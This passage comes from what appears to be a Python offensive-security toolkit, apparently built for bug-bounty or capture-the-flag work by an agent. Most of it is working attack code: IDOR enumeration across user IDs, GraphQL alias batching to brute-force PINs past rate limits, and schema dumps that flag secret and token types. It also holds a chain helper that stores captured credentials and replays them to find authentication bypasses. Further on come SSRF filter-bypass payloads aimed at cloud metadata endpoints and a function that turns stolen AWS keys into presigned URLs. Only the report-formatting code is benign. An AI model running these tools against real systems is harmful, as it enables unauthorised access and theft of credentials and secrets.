                    "id": test_id,
                    "status": response.status_code,
                    "length": len(response.text),
                    "length_diff": len(response.text) - len(baseline_text),
                    "similarity": round(similarity, 3),
                }
                result["distinct_response"] = distinct_response
                print(
                    f"[!] IDOR candidate: ID={test_id} (similarity: {similarity:.1%}, len diff: {len(response.text) - len(baseline_text):+d})"
                )

            results.append(result)
        except requests.exceptions.RequestException as e:
            print(f"[!] ID={test_id} failed: {e}")

    return results


def test_idor(
    url_template: str,
    *,
    id_param: str = "id",
    method: str = "GET",
    auth_token: str | None = None,
    scanner: SecurityScanner | None = None,
) -> dict[str, Any]:
    """Test for Insecure Direct Object Reference.

    url_template should contain {ID} placeholder, e.g.:
        "http://target/api/users/{ID}/profile"
    or a URL with the id in query: "http://target/api/profile?user_id={ID}"

    Tests sequential IDs (1-50) and looks for:
    - Different content per ID (data belongs to different users)
    - Access to IDs without authentication
    - Status 200 on IDs that should require elevated privileges
    """
    scanner = _get_scanner_xss(url_template, scanner)

    headers: dict[str, str] = {}
    if auth_token:
        headers["Authorization"] = f"Bearer {auth_token}"

    print(f"[*] Testing IDOR on {url_template}")
    baseline = _idor_baseline(url_template, scanner, method=method, headers=headers)
    if baseline and "error" in baseline[0]:
        return {"error": baseline[0]["error"]}

    comparison_results = _idor_compare(baseline, scanner)
    distinct_responses = [
        item["distinct_response"] for item in comparison_results if "distinct_response" in item
    ]
    results = [
        {key: value for key, value in item.items() if key != "distinct_response"}
        for item in comparison_results
    ]

    idor_likely = len(distinct_responses) > 0
    summary = {
        "tested_ids": len(results),
        "distinct_responses": len(distinct_responses),
        "idor_likely": idor_likely,
        "distinct_ids": distinct_responses,
        "baseline_id": 1,
        "baseline_status": baseline[0]["status"],
    }
    if idor_likely:
        print(f"\n[!] IDOR LIKELY — {len(distinct_responses)} distinct 200-OK responses found")
        if scanner is not None:
            scanner._record_finding(
                url_template,
                method,
                "idor_scan",
                ["idor_distinct_response"],
                [f"Found {len(distinct_responses)} distinct 200-OK responses across different IDs"],
                "idor",
            )
    else:
        print("\n[-] No IDOR indicators found")

    return {"summary": summary, "results": results}


# ============================================================================
# GraphQL Alias Batch Testing
# ============================================================================


def _graphql_batch_query(
    url: str,
    query_template: str,
    aliases: str,
    session: SecurityScanner,
) -> dict[str, Any]:
    query = query_template.replace("{ALIASES}", aliases)
    try:
        response = session._make_request(
            "POST", url, json={"query": query}, headers={"Content-Type": "application/json"}
        )
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return {"error": str(e)}

    print(f"[*] Response: status={response.status_code}, length={len(response.text)}")

    try:
        data = response.json()
    except (ValueError, json.JSONDecodeError):
        data = {}

    return {"status": response.status_code, "response": data}


def _graphql_alias_detection(responses: dict[str, Any]) -> dict[str, Any]:
    successes: list[str] = []
    errors: list[str] = []

    if responses.get("data"):
        for alias, result in responses["data"].items():
            if isinstance(result, dict) and result.get("success"):
                successes.append(alias)
                print(f"[!] {alias} → SUCCESS")

    if responses.get("errors"):
        for err in responses["errors"]:
            msg = err.get("message", "") if isinstance(err, dict) else str(err)
            errors.append(msg)
        if errors:
            print(f"[?] GraphQL errors (may reveal schema): {errors[:3]}")

    return {"successes": successes, "errors": errors}


def test_graphql_alias_batch(
    url: str,
    query_template: str,
    *,
    field_name: str = "login",
    param_name: str = "pin",
    values: list[str] | None = None,
    scanner: SecurityScanner | None = None,
) -> dict[str, Any]:
    """Test GraphQL alias batching for brute-force amplification.

    Sends a single GraphQL request with N aliases, each testing a different
    value. If the server processes all aliases, you get N results in one
    request — bypassing rate limits.

    query_template should contain {ALIASES} where the alias block goes.
    Example query_template:
        mutation {{ {ALIASES} }}
    where each alias is: m0: login(pin:"0000"){{success}}
    """
    if values is None:
        values = ["0000", "1111", "1234", "1337", "9999", "0001", "12345", "admin"]

    scanner_obj = _get_scanner_xss(url, scanner)
    print(f"[*] Testing GraphQL alias batch on {url}")
    print(f"[*] Testing {len(values)} values in a single request")

    # Build aliases: m0: field_name(param_name:"v0"){success}, m1: ...
    alias_block = " ".join(
        f'm{i}: {field_name}({param_name}:"{v}"){{success}}' for i, v in enumerate(values)
    )

    query_result = _graphql_batch_query(url, query_template, alias_block, scanner_obj)
    if "error" in query_result:
        return {"error": query_result["error"]}

    detection = _graphql_alias_detection(query_result["response"])
    successes = detection["successes"]
    errors = detection["errors"]

    if successes:
        print(f"[!] {len(successes)} successful values found in one request!")
        if scanner_obj is not None:
            scanner_obj._record_finding(
                url,
                "POST",
                "graphql_alias_batch",
                ["graphql_batch_success"],
                [f"{len(successes)} values succeeded in a single request (rate limit bypass)"],
                "graphql",
            )
    elif not errors:
        print("[-] No successes found")

    return {
        "status": query_result["status"],
        "total_tested": len(values),
        "successes": successes,
        "errors": errors,
        "response": query_result["response"],
    }


# ============================================================================
# GraphQL Introspection
# ============================================================================

INTROSPECTION_QUERY = """{
  __schema {
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
          ofType {
            name
            kind
          }
        }
      }
      inputFields {
        name
        type { name kind }
      }
    }
    queries: queryType { name }
    mutations: mutationType { name }
    subscriptions: subscriptionType { name }
  }
}"""

FIELD_QUERY_TEMPLATE = """{{
  __type(name: "{type_name}") {{
    name
    kind
    fields {{
      name
      type {{ name kind ofType {{ name kind }} }}
      args {{ name type {{ name kind }} }}
    }}
    inputFields {{ name type {{ name kind }} }}
    enumValues {{ name }}
  }}
}}"""


def _graphql_send_introspection(url: str, session: SecurityScanner) -> dict[str, Any] | None:
    response = session._make_request(
        "POST",
        url,
        json={"query": INTROSPECTION_QUERY},
        headers={"Content-Type": "application/json"},
    )
    try:
        data = response.json()
    except (ValueError, json.JSONDecodeError):
        data = {}

    return {"status": response.status_code, "text": response.text, "data": data}


def _graphql_parse_schema(introspection_result: dict[str, Any]) -> list[dict[str, Any]]:
    types = introspection_result.get("types", [])
    interesting_types: list[dict[str, Any]] = []
    for graphql_type in types:
        type_name = graphql_type.get("name", "")
        kind = graphql_type.get("kind", "")
        fields = graphql_type.get("fields", [])

        if type_name.startswith("__"):
            continue

        if kind == "OBJECT" and fields:
            field_names = [field.get("name", "") for field in fields if field.get("name")]
            if any(
                keyword in type_name.lower()
                for keyword in [
                    "user",
                    "admin",
                    "auth",
                    "session",
                    "config",
                    "secret",
                    "flag",
                    "token",
                ]
            ):
                interesting_types.append(
                    {
                        "type": type_name,
                        "fields": field_names,
                        "reason": "interesting name",
                    }
                )
                print(f"  [!] {type_name}: {field_names}")
    return interesting_types


def graphql_introspection(
    url: str,
    *,
    scanner: SecurityScanner | None = None,
) -> dict[str, Any]:
    """Perform GraphQL introspection to dump the schema.

    Returns the full schema with all types, queries, mutations, and fields.
    """
    scanner_obj = _get_scanner_xss(url, scanner)
    print(f"[*] GraphQL introspection on {url}")

    introspection_result = _graphql_send_introspection(url, scanner_obj)
    if introspection_result is None:
        return {"introspection_enabled": False, "response": ""}

    status = introspection_result["status"]
    response_text = introspection_result["text"]
    data = introspection_result["data"]

    if status != 200:
        print(f"  [-] Status {status}")
        return {"error": f"HTTP {status}", "response": response_text[:200]}

    if "data" not in data and "errors" in data:
        errors = data.get("errors", [])
        error_msg = errors[0].get("message", "") if errors else ""
        if "introspection" in error_msg.lower():
            print(f"  [-] Introspection disabled: {error_msg}")
            return {"introspection_enabled": False, "error": error_msg}
        print(f"  [-] GraphQL errors: {errors[:2]}")
        return {"introspection_enabled": False, "errors": errors[:3]}

    schema = data.get("data", {}).get("__schema", {})
    if not schema:
        print("  [-] No schema in response")
        return {"introspection_enabled": False, "response": response_text[:500]}

    types = schema.get("types", [])
    queries = schema.get("queries", {}).get("name", "")
    mutations = schema.get("mutations", {}).get("name", "")
    subscriptions = schema.get("subscriptions", {}).get("name", "")

    print("  [+] Introspection enabled!")
    print(f"      Types: {len(types)}")
    print(f"      Query type: {queries}")
    print(f"      Mutation type: {mutations if mutations else 'none'}")
    print(f"      Subscription type: {subscriptions if subscriptions else 'none'}")

    interesting_types = _graphql_parse_schema(schema)

    return {
        "introspection_enabled": True,
        "types": types,
        "query_type": queries,
        "mutation_type": mutations,
        "subscription_type": subscriptions,
        "interesting_types": interesting_types,
        "type_count": len(types),
    }


def graphql_field_dump(
    url: str,
    type_name: str,
    *,
    scanner: SecurityScanner | None = None,
) -> dict[str, Any]:
    """Dump all fields and arguments for a specific GraphQL type."""
    scanner_obj = _get_scanner_xss(url, scanner)
    print(f"[*] GraphQL field dump for type '{type_name}' on {url}")

    query = FIELD_QUERY_TEMPLATE.format(type_name=type_name)
    r = scanner_obj._make_request(
        "POST",
        url,
        json={"query": query},
        headers={"Content-Type": "application/json"},
    )

    if r.status_code != 200:
        return {"error": f"HTTP {r.status_code}"}

    try:
        data = r.json()
    except (ValueError, json.JSONDecodeError):
        return {"error": "invalid JSON response"}

    type_info = data.get("data", {}).get("__type", {})
    if not type_info:
        return {"error": "type not found", "response": data}

    fields = type_info.get("fields", [])
    input_fields = type_info.get("inputFields", [])
    enum_values = type_info.get("enumValues", [])

    print(f"  Type: {type_info.get('name')} ({type_info.get('kind')})")
    if fields:
        print(f"  Fields ({len(fields)}):")
        for f in fields:
            fname = f.get("name", "?")
            ftype = f.get("type", {}).get("name", "?") or f.get("type", {}).get("ofType", {}).get(
                "name", "?"
            )
            args = [a.get("name", "?") for a in f.get("args", [])]
            print(f"    {fname}: {ftype}" + (f" (args: {args})" if args else ""))

    if input_fields:
        print(f"  Input fields ({len(input_fields)}):")
        for inp in input_fields:
            print(f"    {inp.get('name')}: {inp.get('type', {}).get('name', '?')}")

    if enum_values:
        print(f"  Enum values: {[e.get('name') for e in enum_values]}")

    return {
        "type": type_info,
        "fields": fields,
        "input_fields": input_fields,
        "enum_values": enum_values,
    }


# ============================================================================
# Chain Exploitation Helpers
# ============================================================================


class ChainContext:
    """Carries findings from one exploit to feed the next."""

    def __init__(self) -> None:
        self.tokens: dict[str, str] = {}
        self.cookies: dict[str, str] = {}
        self.credentials: list[dict[str, str]] = []
        self.endpoints: list[str] = []
        self.findings: list[dict[str, Any]] = []
        self.session = requests.Session()

    def add_token(self, name: str, token: str, source: str = "") -> None:
        self.tokens[name] = token
        self.findings.append({"type": "token", "name": name, "value": token[:50], "source": source})
        print(f"[+] Token captured: {name} (source: {source})")

    def add_credential(self, user: str, password: str, source: str = "") -> None:
        self.credentials.append({"user": user, "password": password, "source": source})
        self.findings.append({"type": "credential", "user": user, "source": source})
        print(f"[+] Credential captured: {user} (source: {source})")

    def add_finding(self, vuln_type: str, endpoint: str, details: str) -> None:
        self.findings.append(
            {
                "type": vuln_type,
                "endpoint": endpoint,
                "details": details,
                "timestamp": datetime.now().isoformat(),
            }
        )

    def try_endpoints_with_token(
        self, token_name: str, endpoints: list[str], base_url: str
    ) -> list[dict[str, Any]]:
        """Try a list of endpoints with a captured token to find auth bypasses."""
        if token_name not in self.tokens:
            print(f"[!] No token named {token_name}")
            return []
        token = self.tokens[token_name]
        results: list[dict[str, Any]] = []
        print(f"[*] Trying {len(endpoints)} endpoints with token {token_name}")
        for ep in endpoints:
            full_url = base_url.rstrip("/") + ep
            for header_format in [
                {"Authorization": f"Bearer {token}"},
                {"X-Auth-Token": token},
                {"Cookie": f"admin_token={token}"},
            ]:
                try:
                    r = self.session.get(full_url, headers=header_format, timeout=5)
                    if r.status_code == 200 and len(r.text) > 100:
                        header_used = next(iter(header_format.keys()))
                        print(f"[+] {ep} accepted with {header_used} → {r.status_code}")
                        results.append(
                            {
                                "endpoint": ep,
                                "header": header_format,
                                "status": r.status_code,
                                "length": len(r.text),
                            }
                        )
                        break
                except requests.exceptions.RequestException:
                    continue
        return results


# ============================================================================
# Reporting
# ============================================================================


SEVERITY_MAP: dict[str, str] = {
    "command_output": "CRITICAL",
    "file_contents": "HIGH",
    "xxe_triggered": "HIGH",
    "sql_error": "HIGH",
    "ssti_evaluated": "HIGH",
    "auth_bypass": "HIGH",
    "info_leak": "MEDIUM",
    "redirect": "LOW",
    "cookie_set": "INFO",
}

SEVERITY_ORDER: dict[str, int] = {"INFO": 0, "LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}


def _finding_severity(finding: dict[str, Any]) -> str:
    max_sev = "INFO"
    indicators = finding.get("indicators", []) or [finding.get("type", "unknown")]
    for indicator in indicators:
        severity = SEVERITY_MAP.get(str(indicator), "INFO")
        if SEVERITY_ORDER.get(severity, 0) > SEVERITY_ORDER.get(max_sev, 0):
            max_sev = severity
    return max_sev


def _format_finding_text(finding: dict[str, Any], *, index: int = 1) -> str:
    indicators = finding.get("indicators", [])
    max_sev = _finding_severity(finding)

    lines = [
        f"### Finding #{index}: {max_sev} — {finding.get('type', 'vulnerability')}",
        "",
        f"- **Endpoint:** `{finding.get('endpoint', 'N/A')}`",
        f"- **Method:** {finding.get('method', 'N/A')}",
        f"- **Payload:** `{finding.get('payload', 'N/A')}`",
    ]
    if indicators:
        lines.append(f"- **Indicators:** {', '.join(indicators)}")
    if finding.get("details"):
        lines.append("- **Details:**")
        for detail in finding["details"]:
            lines.append(f"  - {detail}")
    return "\n".join(lines)


def _format_report_markdown(
    findings: list[dict[str, Any]],
    target: str | None,
    *,
    history: list[dict[str, Any]] | None = None,
) -> str:
    test_history = history or []
    lines: list[str] = [
        "# Security Assessment Report",
        "",
        f"**Target:** {target}",
        f"**Generated:** {datetime.now().isoformat()}",
        f"**Findings:** {len(findings)}",
        f"**Tests run:** {len(test_history)}",
        "",
    ]

    by_indicator: dict[str, list[dict[str, Any]]] = {}
    for finding in findings:
        for indicator in finding.get("indicators", []) or [finding.get("type", "unknown")]:
            by_indicator.setdefault(indicator, []).append(finding)

    if not findings:
        lines.extend(["## Summary", "", "No vulnerabilities detected."])
        return "\n".join(lines)

    lines.extend(
        [
            "## Summary",
            "",
            "| Indicator | Count |",
            "|:----------|:------|",
        ]
    )
    for indicator, items in sorted(by_indicator.items(), key=lambda item: -len(item[1])):
        lines.append(f"| {indicator} | {len(items)} |")
    lines.append("")

    lines.extend(["## Findings", ""])
    ordered_findings = sorted(
        findings,
        key=lambda finding: SEVERITY_ORDER.get(_finding_severity(finding), 0),
        reverse=True,
    )
    for index, finding in enumerate(ordered_findings, 1):
        lines.extend(_format_finding_text(finding, index=index).splitlines())
        lines.append("")

    return "\n".join(lines)


def _format_report_text(
    findings: list[dict[str, Any]],
    target: str | None,
    *,
    history: list[dict[str, Any]] | None = None,
) -> str:
    return _format_report_markdown(findings, target, history=history)


def generate_report(
    scanner_or_findings: SecurityScanner | list[dict[str, Any]],
    target: str | None = None,
    format: str = "markdown",
) -> str:
    """Generate a structured report from scanner findings.

    Accepts either a SecurityScanner instance or a list of findings.
    """
    if hasattr(scanner_or_findings, "findings"):
        findings = scanner_or_findings.findings
        target = target or getattr(scanner_or_findings, "base_url", "unknown")
        history: list[dict[str, Any]] = getattr(scanner_or_findings, "test_history", [])
    elif isinstance(scanner_or_findings, list):
        findings = scanner_or_findings
        history = []
    else:
        findings = []
        history = []

    if format == "json":
        return json.dumps(
            {
                "target": target,
                "generated_at": datetime.now().isoformat(),
                "findings_count": len(findings),
                "findings": findings,
                "test_history": history,
            },
            indent=2,
            default=str,
        )

    if format == "text":
        return _format_report_text(findings, target, history=history)
    return _format_report_markdown(findings, target, history=history)


def save_report(
    scanner_or_findings: SecurityScanner | list[dict[str, Any]],
    output_path: str | None = None,
    format: str = "markdown",
) -> str:
    """Save a report to disk and return the path."""
    if output_path is None:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        ext = "json" if format == "json" else "md"
        output_path = os.path.expanduser(f"~/.hermes/security_reports/report_{ts}.{ext}")

    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    report = generate_report(scanner_or_findings, format=format)
    with open(output_path, "w") as f:
        f.write(report)
    print(f"[*] Report saved to {output_path}")
    return output_path


# ============================================================================
# SSRF Filter Bypass Detection
# ============================================================================


SSRF_PAYLOADS_LOCALHOST: list[dict[str, str]] = [
    {"name": "localhost", "url": "http://127.0.0.1", "bypasses": "none"},
    {"name": "octal", "url": "http://0177.0.0.1", "bypasses": "127.0.0.1_filter"},
    {"name": "decimal", "url": "http://2130706433", "bypasses": "127.0.0.1_filter"},
    {"name": "hex", "url": "http://0x7f000001", "bypasses": "127.0.0.1_filter"},
    {"name": "short", "url": "http://127.1", "bypasses": "127.0.0.1_filter"},
    {"name": "zero", "url": "http://0", "bypasses": "127.0.0.1_filter"},
    {"name": "all_zeros", "url": "http://0.0.0.0", "bypasses": "127.0.0.1_filter"},
]

SSRF_PAYLOADS_METADATA: list[dict[str, str]] = [
    {"name": "metadata_direct", "url": "http://169.254.169.254", "bypasses": "none"},
    {"name": "metadata_decimal", "url": "http://2852039166", "bypasses": "169.254_filter"},
    {"name": "metadata_octal", "url": "http://0251.0377.0251.0374", "bypasses": "169.254_filter"},
    {"name": "metadata_hex", "url": "http://0xa9fe0001", "bypasses": "169.254_filter"},
]


def detect_ssrf_filter(
    target_url: str,
    scanner: SecurityScanner,
    test_payloads: list[dict[str, str]] | None = None,
    *,
    ssrf_endpoint: str | None = None,
    ssrf_param: str | None = None,
    url_suffix: str = "",
) -> dict[str, Any]:
    """Detect SSRF URL-filter behavior and identify bypasses.

    Generic: the SSRF sink is discovered from the surface (or passed via
    ``ssrf_endpoint``/``ssrf_param``), and ``url_suffix`` is only used if the
    caller already found the target's filter needs one. Nothing target-specific
    is assumed.

    Returns blocked / working payload names, inferred blocked substrings, and
    working bypasses.
    """
    from bugbounty_ctf.engine import _resolve_ssrf_sink, _ssrf_blocked, _ssrf_fetch

    if test_payloads is None:
        test_payloads = SSRF_PAYLOADS_LOCALHOST + SSRF_PAYLOADS_METADATA

    result: dict[str, Any] = {
        "blocked": [],
        "working": [],
        "blocked_substrings": [],
        "bypasses": [],
    }

    endpoint, param = _resolve_ssrf_sink(scanner, ssrf_endpoint, ssrf_param)
    if not endpoint:
        result["error"] = "no SSRF sink discovered — pass ssrf_endpoint"
        return result

    for payload in test_payloads:
        r = _ssrf_fetch(scanner, endpoint, param, payload["url"], url_suffix=url_suffix)
        if _ssrf_blocked(r.text):
            result["blocked"].append(payload["name"])
        else:
            result["working"].append(payload["name"])
            if payload["bypasses"] != "none":
                result["bypasses"].append(payload["name"])

    # Probe which substrings the filter rejects (loopback host keeps this benign).
    for word in ["internal", "metadata", "localhost", "127.0.0.1"]:
        r = _ssrf_fetch(
            scanner, endpoint, param, f"http://127.0.0.1/?probe={word}", url_suffix=url_suffix
        )
        if _ssrf_blocked(r.text):
            result["blocked_substrings"].append(word)

    print(f"[*] SSRF filter: {len(result['blocked'])} blocked, {len(result['working'])} working")
    if result["bypasses"]:
        print(f"[!] Working bypasses: {', '.join(result['bypasses'])}")
    if result["blocked_substrings"]:
        print(f"[*] Blocked substrings: {', '.join(result['blocked_substrings'])}")

    return result


# ============================================================================
# AWS Presigned URL Helper
# ============================================================================


def generate_aws_presigned_url(
    service: str,
    action: str,
    access_key: str,
    secret_key: str,
    session_token: str,
    region: str = "us-east-1",
    endpoint_url: str = "",
    params: dict[str, str] | None = None,
) -> str:
    """Generate an AWS presigned URL for use via SSRF.

    Handles the %2F encoding issue by decoding the URL after generation.
    The signature is computed with %2F, but the URL uses / — servers
    that normalize URL encoding will accept both.

    Requires boto3 to be installed.
    """
    try:
        import boto3
    except ImportError as exc:
        raise ImportError("boto3 is required for AWS presigned URL generation") from exc

    client_kwargs = {
        "aws_access_key_id": access_key,
        "aws_secret_access_key": secret_key,
        "aws_session_token": session_token,
        "region_name": region,
    }
    if endpoint_url:
        client_kwargs["endpoint_url"] = endpoint_url
    client = boto3.client(service, **client_kwargs)

    method_map = {
        "GetCallerIdentity": "get_caller_identity",
        "GetSessionToken": "get_session_token",
        "AssumeRole": "assume_role",
        "ListQueues": "list_queues",
        "GetQueueUrl": "get_queue_url",
        "ReceiveMessage": "receive_message",
        "GetParameter": "get_parameter",
        "GetSecretValue": "get_secret_value",
        "ListBuckets": "list_buckets",
    }

    method_name = method_map.get(action, action.lower().replace("_", "_"))
    if not hasattr(client, method_name):
        method_name = action.lower()

    presigned_url = client.generate_presigned_url(
        method_name,
        Params=params or {},
        ExpiresIn=3600,
        HttpMethod="GET",
    )

    return urllib_parse_unquote(presigned_url)


def urllib_parse_unquote(url: str) -> str:
    """Unquote all percent-encoded characters in a URL.

    Some SSRF filters block ALL %XX patterns, not just %2F.
    This fully decodes the URL so no %XX patterns remain.
    """
    from urllib.parse import unquote

    return unquote(url)
